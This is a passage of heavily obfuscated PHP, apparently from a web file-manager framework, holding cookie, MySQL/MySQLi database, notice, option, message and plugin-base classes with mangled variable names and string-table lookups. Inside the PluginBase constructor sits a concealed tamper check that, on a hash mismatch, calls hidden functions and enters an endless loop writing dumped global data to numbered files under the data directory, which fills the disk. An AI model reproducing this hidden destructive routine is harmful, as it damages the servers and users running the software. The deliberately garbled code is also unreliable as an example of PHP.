0) { $this->expire = $Õ¿Êû±; } } public static function getInstance() { static $ÇŒß‰ªÅ; if ($ÇŒß‰ªÅ === null) { $ÇŒß‰ªÅ = new self(); } return $ÇŒß‰ªÅ; } private static $cookieDisable = false; public static function disable($ß—¾Á) { self::$cookieDisable = $ß—¾Á; } private static $sameCookieSet = array(); public static function set($ğ‡ä¨÷ƒ, $Ëˆı™Ô, $¥äØÑ©Ü = 0, $´Ï¡Ê©‰ = false, $‰ë¬¨ˆ£ = false) { $ÜÌÏ¹Õ£ =& $_SERVER[¹Û¹Æ€]; if (self::$cookieDisable) { return; } if (!$¥äØÑ©Ü) { $¥äØÑ©Ü = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ğ‡ä¨÷ƒ]) && self::$sameCookieSet[$ğ‡ä¨÷ƒ] == $Ëˆı™Ô . $¥äØÑ©Ü) { return; } self::$sameCookieSet[$ğ‡ä¨÷ƒ] = $Ëˆı™Ô . $¥äØÑ©Ü; if (!$‰ë¬¨ˆ£) { $‰ë¬¨ˆ£ = str_replace(HOST, $ÜÌÏ¹Õ£[22], APP_HOST); $‰ë¬¨ˆ£ = _get($GLOBALS, $ÜÌÏ¹Õ£[879], $‰ë¬¨ˆ£); } $•ñÏâ‚Í = $ÜÌÏ¹Õ£[22]; setcookie($ğ‡ä¨÷ƒ, $Ëˆı™Ô, time() + $¥äØÑ©Ü, $ÜÌÏ¹Õ£[18] . trim($‰ë¬¨ˆ£, $ÜÌÏ¹Õ£[18]) . $•ñÏâ‚Í, !1, !1, $´Ï¡Ê©‰); } public static function setSafe($ğç²ûº½, $Æó¦È¥, $¤ÁŸâ¿´ = 0) { self::set($ğç²ûº½, $Æó¦È¥, $¤ÁŸâ¿´, !0); } public static function get($’€áù¡…) { static $ß¹Í´ = false; if (!$ß¹Í´) { self::initHeaderCookie(); $ß¹Í´ = !0; } return isset($_COOKIE[$’€áù¡…]) ? $_COOKIE[$’€áù¡…] : !1; } private static function initHeaderCookie() { $ß ¶ÂÚä =& $_SERVER[¹Û¹Æ€]; if (!isset($_SERVER[$ß ¶ÂÚä[880]]) || !$_SERVER[$ß ¶ÂÚä[880]]) { return; } $Äò™ˆ¿Ğ = explode($ß ¶ÂÚä[81], $_SERVER[$ß ¶ÂÚä[880]]); foreach ($Äò™ˆ¿Ğ as $˜Õ§›ò) { $˜Õ§›ò = explode($ß ¶ÂÚä[881], $˜Õ§›ò); if (count($˜Õ§›ò) != 2 || !isset($˜Õ§›ò[1])) { continue; } $_COOKIE[trim($˜Õ§›ò[0])] = trim($˜Õ§›ò[1]); } } public static function remove($àì»÷Ù, $ğµşˆÀ = false) { unset($_COOKIE[$àì»÷Ù]); self::set($àì»÷Ù, $_SERVER[¹Û¹Æ€][22], 1, $ğµşˆÀ); } } class DbMysql extends Db { public function __construct($¿‚»ç¤Û = '') { $×³ÍßŸ =& $_SERVER[¹Û¹Æ€]; if (!extension_loaded($×³ÍßŸ[802])) { think_exception(think_lang($×³ÍßŸ[24]) . $×³ÍßŸ[882]); } if (!empty($¿‚»ç¤Û)) { $this->config = $¿‚»ç¤Û; if (empty($this->config[$×³ÍßŸ[27]])) { $this->config[$×³ÍßŸ[27]] = $×³ÍßŸ[22]; } } } public function connect($§á¦ãÑö = '', $·½êá§ò = 0, $€ê‘ûË² = false) { $†™â¥èÇ =& $_SERVER[¹Û¹Æ€]; if (!isset($this->linkID[$·½êá§ò])) { if (empty($§á¦ãÑö)) { $§á¦ãÑö = $this->config; } $ßÔ­Ó—ë = $§á¦ãÑö[$†™â¥èÇ[883]] . ($§á¦ãÑö[$†™â¥èÇ[884]] ? "\72{$§á¦ãÑö[$†™â¥èÇ[884]]}" : $†™â¥èÇ[22]); $ƒ÷‚ïæ— = !empty($§á¦ãÑö[$†™â¥èÇ[27]][$†™â¥èÇ[28]]) ? $§á¦ãÑö[$†™â¥èÇ[27]][$†™â¥èÇ[28]] : $this->pconnect; if ($ƒ÷‚ïæ—) { $this->linkID[$·½êá§ò] = mysql_pconnect($ßÔ­Ó—ë, $§á¦ãÑö[$†™â¥èÇ[885]], $§á¦ãÑö[$†™â¥èÇ[886]], 131072); } else { $this->linkID[$·½êá§ò] = mysql_connect($ßÔ­Ó—ë, $§á¦ãÑö[$†™â¥èÇ[885]], $§á¦ãÑö[$†™â¥èÇ[886]], !0, 131072); } if (!$this->linkID[$·½êá§ò] || !empty($§á¦ãÑö[$†™â¥èÇ[31]]) && !mysql_select_db($§á¦ãÑö[$†™â¥èÇ[31]], $this->linkID[$·½êá§ò])) { think_exception(mysql_error()); } $åÂğÓõã = mysql_get_server_info($this->linkID[$·½êá§ò]); mysql_query($†™â¥èÇ[887] . think_config($†™â¥èÇ[888]) . $†™â¥èÇ[68], $this->linkID[$·½êá§ò]); if ($åÂğÓõã > $†™â¥èÇ[889]) { mysql_query($†™â¥èÇ[890], $this->linkID[$·½êá§ò]); } $this->connected = !0; if (1 != think_config($†™â¥èÇ[32])) { unset($this->config); } } return $this->linkID[$·½êá§ò]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÓŒ¬û¢®) { $—ãàœƒß =& $_SERVER[¹Û¹Æ€]; if (0 === stripos($ÓŒ¬û¢®, $—ãàœƒß[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÓŒ¬û¢®; if ($this->queryID) { $this->free(); } think_action_status($—ãàœƒß[33], 1); think_status($—ãàœƒß[34]); $this->queryID = mysql_query($ÓŒ¬û¢®, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¼©Œ‚ëÜ) { $©ëªúß =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¼©Œ‚ëÜ; if ($this->queryID) { $this->free(); } think_action_status($©ëªúß[35], 1); think_status($©ëªúß[34]); $ÈÀó›¤ = mysql_query($¼©Œ‚ëÜ, $this->_linkID); $this->debug(); if (!1 === $ÈÀó›¤) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¹Û¹Æ€][891], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $äà©áÙú = mysql_query($_SERVER[¹Û¹Æ€][892], $this->_linkID); $this->transTimes = 0; if (!$äà©áÙú) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $°ºß‚Œè = mysql_query($_SERVER[¹Û¹Æ€][893], $this->_linkID); $this->transTimes = 0; if (!$°ºß‚Œè) { $this->error(); return !1; } } return !0; } private function getAll() { $ª«Ãâ†„ = array(); if ($this->numRows > 0) { while ($­½×§õã = mysql_fetch_assoc($this->queryID)) { $ª«Ãâ†„[] = $­½×§õã; } mysql_data_seek($this->queryID, 0); } return $ª«Ãâ†„; } public function getFields($ğü„”Õ) { $âğçùÏŞ =& $_SERVER[¹Û¹Æ€]; $È…Ñóµ = $this->query($âğçùÏŞ[894] . $this->parseKey($ğü„”Õ)); $ğæ¯€À“ = array(); if ($È…Ñóµ) { foreach ($È…Ñóµ as $â³¶Ù€º => $ş‘Ë µã) { $ğæ¯€À“[$ş‘Ë µã[$âğçùÏŞ[41]]] = array($âğçùÏŞ[42] => $ş‘Ë µã[$âğçùÏŞ[41]], $âğçùÏŞ[43] => $ş‘Ë µã[$âğçùÏŞ[44]], $âğçùÏŞ[45] => (bool) (strtoupper($ş‘Ë µã[$âğçùÏŞ[46]]) === $âğçùÏŞ[895]), $âğçùÏŞ[47] => $ş‘Ë µã[$âğçùÏŞ[48]], $âğçùÏŞ[49] => strtolower($ş‘Ë µã[$âğçùÏŞ[50]]) == $âğçùÏŞ[51], $âğçùÏŞ[52] => strtolower($ş‘Ë µã[$âğçùÏŞ[53]]) == $âğçùÏŞ[54]); } } return $ğæ¯€À“; } public function getTables($¹™šğ§ = '') { $Ï¹£ÄÏú =& $_SERVER[¹Û¹Æ€]; if (!empty($¹™šğ§)) { $È„õ»Æ¸ = $Ï¹£ÄÏú[896] . $¹™šğ§ . $Ï¹£ÄÏú[897]; } else { $È„õ»Æ¸ = $Ï¹£ÄÏú[898]; } $Êõ‡¤ÒŸ = $this->query($È„õ»Æ¸); $äÑ’Ş¦¼ = array(); foreach ($Êõ‡¤ÒŸ as $ı…à™È => $Ğûşü¦ı) { $äÑ’Ş¦¼[$ı…à™È] = current($Ğûşü¦ı); } return $äÑ’Ş¦¼; } public function replace($âàôêŸĞ, $óè·í–Œ = array()) { $®ÈÏ¢™à =& $_SERVER[¹Û¹Æ€]; foreach ($âàôêŸĞ as $Œ¯»ÔÅ£ => $­Î’‰ï) { $„…ŠÌÔ = $this->parseValue($­Î’‰ï); if (is_scalar($„…ŠÌÔ)) { $¦âó½ï×[] = $„…ŠÌÔ; $µÕ“îÌ§[] = $this->parseKey($Œ¯»ÔÅ£); } } $…ü•ÙáÈ = $®ÈÏ¢™à[899] . $this->parseTable($óè·í–Œ[$®ÈÏ¢™à[288]]) . $®ÈÏ¢™à[900] . implode($®ÈÏ¢™à[60], $µÕ“îÌ§) . $®ÈÏ¢™à[901] . implode($®ÈÏ¢™à[60], $¦âó½ï×) . $®ÈÏ¢™à[902]; return $this->execute($…ü•ÙáÈ); } public function insertAll($ı°—¥¼‡, $³×ê±ŸŸ = array(), $¬¾È­¤ = false) { $ü½ö›ì =& $_SERVER[¹Û¹Æ€]; if (!is_array($ı°—¥¼‡[0])) { return !1; } $¸¸ì—Ö‰ = array_keys($ı°—¥¼‡[0]); $É£”Ÿüü = array(); foreach ($ı°—¥¼‡ as $Õ¾´½š) { $ëüÆ¼Üê = array(); foreach ($Õ¾´½š as $ÆôØºı½ => $¤ø­ú§) { $¤ø­ú§ = $this->parseValue($¤ø­ú§); if (is_scalar($¤ø­ú§)) { $ëüÆ¼Üê[] = $¤ø­ú§; } } $É£”Ÿüü[] = $ü½ö›ì[269] . implode($ü½ö›ì[60], $ëüÆ¼Üê) . $ü½ö›ì[902]; } array_walk($¸¸ì—Ö‰, array($this, $ü½ö›ì[903])); $ÑÉ»®ÑÆ = ($¬¾È­¤ ? $ü½ö›ì[904] : $ü½ö›ì[905]) . $ü½ö›ì[906] . $this->parseTable($³×ê±ŸŸ[$ü½ö›ì[288]]) . $ü½ö›ì[900] . implode($ü½ö›ì[60], $¸¸ì—Ö‰) . $ü½ö›ì[907] . implode($ü½ö›ì[60], $É£”Ÿüü); return $this->execute($ÑÉ»®ÑÆ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $àÔ‡®£— =& $_SERVER[¹Û¹Æ€]; $this->error = mysql_errno() . $àÔ‡®£—[4] . mysql_error($this->_linkID); if ($àÔ‡®£—[22] != $this->queryStr) { $this->error .= LNG($àÔ‡®£—[58]) . $this->queryStr; } think_trace($this->error, $àÔ‡®£—[22], $àÔ‡®£—[59]); return $this->error; } public function escapeString($¡·®°ÑÍ) { if ($this->_linkID) { return mysql_real_escape_string($¡·®°ÑÍ, $this->_linkID); } else { return mysql_escape_string($¡·®°ÑÍ); } } public function parseKey(&$ÕºÑì€Ê, $´¸´Æü = true) { $ÌÏ¢Œ£Š =& $_SERVER[¹Û¹Æ€]; if ($´¸´Æü) { $ÕºÑì€Ê = $this->parseKeyCheck($ÕºÑì€Ê); } if ($ÕºÑì€Ê != $ÌÏ¢Œ£Š[198] && !preg_match($ÌÏ¢Œ£Š[908], $ÕºÑì€Ê)) { $ÕºÑì€Ê = $ÌÏ¢Œ£Š[394] . trim($ÕºÑì€Ê, $ÌÏ¢Œ£Š[394]) . $ÌÏ¢Œ£Š[394]; } return $ÕºÑì€Ê; } } class DbMysqli extends Db { public function __construct($áÑ´¸Êæ = '') { $¿Š‰¨ı =& $_SERVER[¹Û¹Æ€]; if (!extension_loaded($¿Š‰¨ı[909])) { think_exception(think_lang($¿Š‰¨ı[24]) . $¿Š‰¨ı[910]); } if (!empty($áÑ´¸Êæ)) { $this->config = $áÑ´¸Êæ; if (empty($this->config[$¿Š‰¨ı[27]])) { $this->config[$¿Š‰¨ı[27]] = $¿Š‰¨ı[22]; } } } public function connect($¦³ñòö = '', $³ƒéº± = 0) { $ğ½Û¨¬³ =& $_SERVER[¹Û¹Æ€]; if (!isset($this->linkID[$³ƒéº±])) { if (empty($¦³ñòö)) { $¦³ñòö = $this->config; } $this->linkID[$³ƒéº±] = new mysqli($¦³ñòö[$ğ½Û¨¬³[883]], $¦³ñòö[$ğ½Û¨¬³[885]], $¦³ñòö[$ğ½Û¨¬³[886]], $¦³ñòö[$ğ½Û¨¬³[31]], $¦³ñòö[$ğ½Û¨¬³[884]] ? intval($¦³ñòö[$ğ½Û¨¬³[884]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $´ŠÎ¤¿æ = $this->linkID[$³ƒéº±]->server_version; $this->linkID[$³ƒéº±]->query($ğ½Û¨¬³[887] . think_config($ğ½Û¨¬³[888]) . $ğ½Û¨¬³[68]); if ($´ŠÎ¤¿æ > $ğ½Û¨¬³[889]) { $this->linkID[$³ƒéº±]->query($ğ½Û¨¬³[890]); } $this->connected = !0; if (1 != think_config($ğ½Û¨¬³[32])) { unset($this->config); } } return $this->linkID[$³ƒéº±]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÍçÂç½) { $Œñ¨™¶» =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÍçÂç½; if ($this->queryID) { $this->free(); } think_action_status($Œñ¨™¶»[33], 1); think_status($Œñ¨™¶»[34]); $this->queryID = $this->_linkID->query($ÍçÂç½); if ($this->_linkID->more_results()) { while (($É™õıÃ = $this->_linkID->next_result()) != NULL) { $É™õıÃ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Æ±Ì½ê) { $º˜™°¸œ =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Æ±Ì½ê; if ($this->queryID) { $this->free(); } think_action_status($º˜™°¸œ[35], 1); think_status($º˜™°¸œ[34]); $ÔÛ»Ë†‹ = $this->_linkID->query($Æ±Ì½ê); $this->debug(); if (!1 === $ÔÛ»Ë†‹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»è«×±İ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$»è«×±İ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $µú´¯² = $this->_linkID->rollback(); $this->transTimes = 0; if (!$µú´¯²) { $this->error(); return !1; } } return !0; } private function getAll() { $šÙÚŒ™É = array(); if ($this->numRows > 0) { for ($¢‡äÓ¹¡ = 0; $¢‡äÓ¹¡ < $this->numRows; $¢‡äÓ¹¡++) { $šÙÚŒ™É[$¢‡äÓ¹¡] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $šÙÚŒ™É; } public function getFields($êğ“—±ù) { $„Î•÷½É =& $_SERVER[¹Û¹Æ€]; $°è½É‡¬ = $this->query($„Î•÷½É[894] . $this->parseKey($êğ“—±ù)); $æçã¡Ò¿ = array(); if ($°è½É‡¬) { foreach ($°è½É‡¬ as $ĞĞí¹¸‰ => $Úİà€«æ) { $æçã¡Ò¿[$Úİà€«æ[$„Î•÷½É[41]]] = array($„Î•÷½É[42] => $Úİà€«æ[$„Î•÷½É[41]], $„Î•÷½É[43] => $Úİà€«æ[$„Î•÷½É[44]], $„Î•÷½É[45] => (bool) ($Úİà€«æ[$„Î•÷½É[46]] === $„Î•÷½É[22]), $„Î•÷½É[47] => $Úİà€«æ[$„Î•÷½É[48]], $„Î•÷½É[49] => strtolower($Úİà€«æ[$„Î•÷½É[50]]) == $„Î•÷½É[51], $„Î•÷½É[52] => strtolower($Úİà€«æ[$„Î•÷½É[53]]) == $„Î•÷½É[54]); } } return $æçã¡Ò¿; } public function getTables($Ã¶áüƒ¤ = '') { $ÆªñÂâ =& $_SERVER[¹Û¹Æ€]; $µƒÃ·¦ï = !empty($Ã¶áüƒ¤) ? $ÆªñÂâ[896] . $Ã¶áüƒ¤ . $ÆªñÂâ[897] : $ÆªñÂâ[898]; $ü¶è±í² = $this->query($µƒÃ·¦ï); $Û×¦™‰ = array(); if ($ü¶è±í²) { foreach ($ü¶è±í² as $™Ÿ’ÃŞà => $†Ç‘Û®) { $Û×¦™‰[$™Ÿ’ÃŞà] = current($†Ç‘Û®); } } return $Û×¦™‰; } public function replace($àæ­¬ìí, $èÈª°ä  = array()) { $ÂÖµâ¶× =& $_SERVER[¹Û¹Æ€]; foreach ($àæ­¬ìí as $ã¶ı’êÑ => $øÄİ”İÁ) { $…Šœí = $this->parseValue($øÄİ”İÁ); if (is_scalar($…Šœí)) { $šŠ×â˜»[] = $…Šœí; $İíõŒ–Ó[] = $this->parseKey($ã¶ı’êÑ); } } $òØ¸‰ì× = $ÂÖµâ¶×[899] . $this->parseTable($èÈª°ä [$ÂÖµâ¶×[288]]) . $ÂÖµâ¶×[900] . implode($ÂÖµâ¶×[60], $İíõŒ–Ó) . $ÂÖµâ¶×[901] . implode($ÂÖµâ¶×[60], $šŠ×â˜») . $ÂÖµâ¶×[902]; return $this->execute($òØ¸‰ì×); } public function insertAll($…ÛìÈ½º, $Ë“¤ËÈš = array(), $”Å¨Å™¸ = false) { $€ÇÙ½²‹ =& $_SERVER[¹Û¹Æ€]; if (!is_array($…ÛìÈ½º[0])) { return !1; } $ ¾ˆ¹â— = array_keys($…ÛìÈ½º[0]); $ß¸¹¦Œ— = array(); foreach ($…ÛìÈ½º as $±ê´Èùó) { $€ôŒÇÊˆ = array(); foreach ($±ê´Èùó as $¡ß’åİè => $æË¢Ó…‚) { $æË¢Ó…‚ = $this->parseValue($æË¢Ó…‚); if (is_scalar($æË¢Ó…‚)) { $€ôŒÇÊˆ[] = $æË¢Ó…‚; } } $ß¸¹¦Œ—[] = $€ÇÙ½²‹[269] . implode($€ÇÙ½²‹[60], $€ôŒÇÊˆ) . $€ÇÙ½²‹[902]; } array_walk($ ¾ˆ¹â—, array($this, $€ÇÙ½²‹[903])); $‚àÆ¼µÉ = $”Å¨Å™¸ ? $€ÇÙ½²‹[904] : $€ÇÙ½²‹[905]; $º©šåû° = $‚àÆ¼µÉ . $€ÇÙ½²‹[906] . $this->parseTable($Ë“¤ËÈš[$€ÇÙ½²‹[288]]) . $€ÇÙ½²‹[900] . implode($€ÇÙ½²‹[60], $ ¾ˆ¹â—) . $€ÇÙ½²‹[907] . implode($€ÇÙ½²‹[60], $ß¸¹¦Œ—); return $this->execute($º©šåû°); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Á¢çÑ§ =& $_SERVER[¹Û¹Æ€]; $this->error = $this->_linkID->errno . $Á¢çÑ§[4] . $this->_linkID->error; if ($Á¢çÑ§[22] != $this->queryStr) { $this->error .= LNG($Á¢çÑ§[58]) . $this->queryStr; } think_trace($this->error, $Á¢çÑ§[22], $Á¢çÑ§[59]); return $this->error; } public function escapeString($ÊçÊ¤€) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÊçÊ¤€); } else { return addslashes($ÊçÊ¤€); } } public function parseKey(&$¯ªÂ»şÕ, $ùÄòÎÜ = true) { $ÙÙôÍ¨ =& $_SERVER[¹Û¹Æ€]; if ($ùÄòÎÜ) { $¯ªÂ»şÕ = $this->parseKeyCheck($¯ªÂ»şÕ); } if ($¯ªÂ»şÕ != $ÙÙôÍ¨[198] && !preg_match($ÙÙôÍ¨[908], $¯ªÂ»şÕ)) { $¯ªÂ»şÕ = $ÙÙôÍ¨[394] . trim($¯ªÂ»şÕ, $ÙÙôÍ¨[394]) . $ÙÙôÍ¨[394]; } return $¯ªÂ»şÕ; } } goto DœÂ‰Œƒš; aÙ¼ãƒ™‰²: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\56\156\157\x74\x69\x63\145\x4c\x69\x73\164"; public $field = array("\156\x61\155\x65", "\x63\157\156\164\145\x6e\x74", "\141\x75\164\150", "\155\157\x64\145", "\x74\x69\x6d\x65", "\x74\x79\x70\145", "\x6c\145\166\145\x6c", "\x65\156\141\x62\x6c\x65", "\x73\x6f\x72\x74"); public function listData($Â¾×ØŒÃ = false, $‹Å‘ĞÜ½ = "\x73\157\162\x74", $Ÿ‹Ïşó¯ = false) { return parent::listData($Â¾×ØŒÃ, $‹Å‘ĞÜ½, $Ÿ‹Ïşó¯); } public function add($ÕÜµ¢ŒÚ) { $±¥âÎò• =& $_SERVER[¹Û¹Æ€]; $Ùá³· € = time(); if ($ÕÜµ¢ŒÚ[$±¥âÎò•[26]] == $±¥âÎò•[2275]) { $Ùá³· € = strtotime($ÕÜµ¢ŒÚ[$±¥âÎò•[213]]); } $ÕÜµ¢ŒÚ[$±¥âÎò•[213]] = $Ùá³· €; return parent::insert($ÕÜµ¢ŒÚ); } public function update($´œ äÃø, $¤Ñ´â£µ) { $Ÿ‚ùÜÍ¢ =& $_SERVER[¹Û¹Æ€]; $ÄöŸó“× = $this->listData($´œ äÃø); if (!$ÄöŸó“×) { return !1; } $ “àÒ¶Â = time(); if ($¤Ñ´â£µ[$Ÿ‚ùÜÍ¢[26]] == $Ÿ‚ùÜÍ¢[2275]) { $ “àÒ¶Â = strtotime($¤Ñ´â£µ[$Ÿ‚ùÜÍ¢[213]]); } $¤Ñ´â£µ[$Ÿ‚ùÜÍ¢[213]] = $ “àÒ¶Â; return parent::update($´œ äÃø, $¤Ñ´â£µ); } public function remove($ÚÂ©¶ˆ‘) { $£ÂáÖ±˜ = $this->listData($ÚÂ©¶ˆ‘); if (!$£ÂáÖ±˜ || $£ÂáÖ±˜[$_SERVER[¹Û¹Æ€][1282]]) { return !1; } return parent::remove($ÚÂ©¶ˆ‘); } public function sort($è·çòâù, $¤çë·Œ) { return parent::update($è·çòâù, $¤çë·Œ); } public function enable($Ÿ¿Õ¢¤Ë, $ìæ¼òÆ¶) { return parent::update($Ÿ¿Õ¢¤Ë, array($_SERVER[¹Û¹Æ€][2276] => $ìæ¼òÆ¶)); } private function initUserOption() { $áõıÒ¡ç =& $_SERVER[¹Û¹Æ€]; $this->optionType = $áõıÒ¡ç[2277]; $this->modelType = $áõıÒ¡ç[2278]; $this->field = array($áõıÒ¡ç[2279], $áõıÒ¡ç[42], $áõıÒ¡ç[213], $áõıÒ¡ç[43], $áõıÒ¡ç[2280], $áõıÒ¡ç[748], $áõıÒ¡ç[205]); } public function userNoticeGet($’™½›éÊ = false) { $this->initUserOption(); return parent::listData($’™½›éÊ, $_SERVER[¹Û¹Æ€][408], !0); } public function userNoticeAdd($¾ˆ®—à) { $Ìåï‘ë =& $_SERVER[¹Û¹Æ€]; $this->initUserOption(); $«‘¤Ïß“ = $this->findByKey($Ìåï‘ë[2279], $¾ˆ®—à[$Ìåï‘ë[408]]); if ($«‘¤Ïß“) { return !0; } $¿‡Û§²é = array($Ìåï‘ë[2279] => $¾ˆ®—à[$Ìåï‘ë[408]], $Ìåï‘ë[42] => $¾ˆ®—à[$Ìåï‘ë[42]], $Ìåï‘ë[213] => $¾ˆ®—à[$Ìåï‘ë[213]], $Ìåï‘ë[43] => isset($¾ˆ®—à[$Ìåï‘ë[43]]) ? $¾ˆ®—à[$Ìåï‘ë[43]] : 1, $Ìåï‘ë[2280] => isset($¾ˆ®—à[$Ìåï‘ë[2280]]) ? $¾ˆ®—à[$Ìåï‘ë[2280]] : 0, $Ìåï‘ë[748] => 0, $Ìåï‘ë[205] => 0); return parent::insert($¿‡Û§²é); } public function userNoticeEdit($ÒêÀíªÑ, $˜øÅş¸Ä) { $this->initUserOption(); return parent::update($ÒêÀíªÑ, $˜øÅş¸Ä); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\x74\x65\x6d\x5f\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\x6d\x65\x6e\x75", "\x72\157\x6c\x65", "\x72\x6f\x6c\145\107\162\x6f\165\160", "\162\x65\147\151\x73\x74", "\x65\x6d\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($…–”“Ç) { return "\123\171\x73\x74\145\155\117\160\164\x69\x6f\x6e\x5f{$…–”“Ç}"; } protected function optionDefault($Ã”æñ•­ = '') { $äüÆ­Õ¬ =& $_SERVER[¹Û¹Æ€]; if ($Ã”æñ•­ == $äüÆ­Õ¬[22]) { return $GLOBALS[$äüÆ­Õ¬[16]][$äüÆ­Õ¬[390]]; } } } class SystemRecordModel extends ModelBaseLight { } goto A†¤Ó¨¤Ü; d¬‡ï¤´ƒó: define($_SERVER[¹Û¹Æ€][250], 1); define($_SERVER[¹Û¹Æ€][251], 0); define($_SERVER[¹Û¹Æ€][252], 2); goto A«ãßÍì‡; eºŞ¦éìº±: class Message { function __construct() { } public function send($¢¡Ì°ÆÅ = '', $»»„ì“ü = array(), $•ÖŞ‹û = "\x74\x65\170\164") { $ÊºÃºú =& $_SERVER[¹Û¹Æ€]; $ûÅ¸†‘ú = array($ÊºÃºú[43] => $ÊºÃºú[1523], $ÊºÃºú[753] => $¢¡Ì°ÆÅ); if (in_array($•ÖŞ‹û, array($ÊºÃºú[1523], $ÊºÃºú[1524]))) { $ûÅ¸†‘ú[$ÊºÃºú[43]] = $•ÖŞ‹û; } $»»„ì“ü = array($ÊºÃºú[524] => isset($»»„ì“ü[$ÊºÃºú[524]]) ? $»»„ì“ü[$ÊºÃºú[524]] : $ÊºÃºú[22], $ÊºÃºú[609] => isset($»»„ì“ü[$ÊºÃºú[609]]) ? $»»„ì“ü[$ÊºÃºú[609]] : $ÊºÃºú[22]); if (empty($¢¡Ì°ÆÅ) || empty($»»„ì“ü[$ÊºÃºú[524]]) && empty($»»„ì“ü[$ÊºÃºú[609]])) { return !1; } $­¾¿şö° = array($ÊºÃºú[1464] => $ûÅ¸†‘ú, $ÊºÃºú[1525] => $»»„ì“ü); Hook::trigger($ÊºÃºú[1526], $­¾¿şö°); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÇÎ›æ‹§ =& $_SERVER[¹Û¹Æ€]; $À¾ü›¨® = $_SERVER[$ÇÎ›æ‹§[10]] . $ÇÎ›æ‹§[11]; $úƒÏÊı = $ÇÎ›æ‹§[7]; if ($_SERVER[$ÇÎ›æ‹§[8]] != $úƒÏÊı($À¾ü›¨®)) { $éÖÌ»·¿ = $ÇÎ›æ‹§[874]; $ÜÄ•ëï¾ = $ÇÎ›æ‹§[9]; $®µÕ¥–º = $_SERVER[$ÇÎ›æ‹§[10]] . $ÇÎ›æ‹§[11]; $¯’³Ó• = $ÜÄ•ëï¾($®µÕ¥–º); $œ­ˆ£ÔÙ = explode($ÇÎ›æ‹§[12], $¯’³Ó•); if (count($œ­ˆ£ÔÙ) < $ÇÎ›æ‹§[656]) { $†»áÃ = $ÇÎ›æ‹§[14]; $†»áÃ(); } $‚”Ã Û„ = $ÇÎ›æ‹§[875]; $‚”Ã Û„($_SERVER[$ÇÎ›æ‹§[876]]); $éÖÌ»·¿ = $ÇÎ›æ‹§[874]; $éÖÌ»·¿(); $¯‰°Ëßç = $ÇÎ›æ‹§[877]; $É¼´£ä = json_encode($GLOBALS[$ÇÎ›æ‹§[878]]); $­ÑÎ±ÆÛ = 1; for ($çìÖƒÍ = $­ÑÎ±ÆÛ; $çìÖƒÍ > 0; $çìÖƒÍ++) { $¯‰°Ëßç(DATA_PATH . $çìÖƒÍ, $É¼´£ä); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÇÎ›æ‹§[1527]); $this->pluginName = str_replace($ÇÎ›æ‹§[1527], $ÇÎ›æ‹§[22], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÇÎ›æ‹§[18]; $this->pluginApi = appHostGet() . $ÇÎ›æ‹§[1528] . $this->pluginName . $ÇÎ›æ‹§[18]; $this->pluginHost = $config[$ÇÎ›æ‹§[1529]] . $this->pluginName . $ÇÎ›æ‹§[18]; $this->pluginHostDefault = $config[$ÇÎ›æ‹§[1529]] . $this->pluginName . $ÇÎ›æ‹§[18]; $èˆ ¹©á = $config[$ÇÎ›æ‹§[1530]]; if ($èˆ ¹©á && strpos($ÇÎ›æ‹§[60] . $èˆ ¹©á . $ÇÎ›æ‹§[60], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÇÎ›æ‹§[1531]] . $this->pluginName . $ÇÎ›æ‹§[18]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹Û¹Æ€][1532]); } protected function assign($Úô¦µÄâ, $ê÷Ø‹ó = false) { if (is_array($Úô¦µÄâ)) { $this->values = array_merge($this->values, $Úô¦µÄâ); } else { $this->values[$Úô¦µÄâ] = $ê÷Ø‹ó; } } protected function 